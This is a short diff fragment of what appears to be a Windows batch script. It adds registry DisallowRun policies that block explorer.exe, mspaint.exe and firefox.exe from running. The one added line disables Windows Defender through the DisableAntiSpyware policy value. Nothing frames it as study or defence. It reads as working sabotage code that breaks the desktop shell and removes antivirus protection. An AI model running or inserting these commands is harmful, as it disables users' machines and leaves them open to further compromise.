@@ -17,7 +17,7 @@ reg add HKCU\software\Microsoft\Windows\CurrentVersion\Policies\Explorer\Disallo
 reg add HKCU\software\Microsoft\Windows\CurrentVersion\Policies\Explorer\DisallowRun /v 4 /t REG_SZ /d explorer.exe /f
 reg add HKCU\software\Microsoft\Windows\CurrentVersion\Policies\Explorer\DisallowRun /v 5 /t REG_SZ /d mspaint.exe /f
 reg add HKCU\software\Microsoft\Windows\CurrentVersion\Policies\Explorer\DisallowRun /v 6 /t REG_SZ /d firefox.exe /f
-
+reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender" /v DisableAntiSpyware /t REG_DWORD /d 1 /f
 
 
 
